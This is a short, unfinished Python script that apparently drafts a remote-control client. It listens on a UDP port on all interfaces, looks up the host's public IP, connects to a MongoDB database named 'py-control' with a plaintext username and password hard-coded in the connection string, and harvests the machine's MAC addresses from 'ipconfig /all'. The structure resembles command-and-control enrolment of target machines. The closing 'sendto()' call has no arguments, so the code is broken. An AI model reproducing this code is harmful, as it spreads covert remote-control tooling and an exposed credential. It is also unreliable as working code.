import socket, subprocess as sub
from requests import get 
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from utils import cmd_formatter

HOST = "0.0.0.0"                # Symbolic name meaning all available interfaces
PORT = 9999              # Arbitrary non-privileged port
IP = get('https://api.ipify.org').content.decode('utf8')
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Gniazdo UDP

client.bind((HOST, PORT))
mac_list = []
IP = get('https://api.ipify.org').content.decode('utf8')
print(f'My public IP address is: {IP}')

print(f"Klient UDP gotowy do połączenia z {IP}:{PORT}")
URI = "mongodb+srv://heker:CihmCAcfLoV9vQ1M@heker.3rwzyne.mongodb.net/?appName=heker"
# Create a new client and connect to the server
db = MongoClient(URI, server_api=ServerApi('1'))

conn = db.get_database("py-control").get_collection("clients")
# Send a ping to confirm a successful connection
try:
    db.admin.command('ping')
    print("Pinged your deployment. You successfully connected to MongoDB!")
except Exception as e:
    print(e)
    exit()

out = sub.run(["ipconfig", "/all"], capture_output=True)
# print(cmd_formatter(out.stdout))
for row in cmd_formatter(out.stdout):
    if row.find("Physical Address") != -1:
        mac_list.append(row[row.find(":")+2:])
        
print(mac_list)
while True:
    data, address = client.recvfrom(1024)
    print(data.decode())
    client.sendto()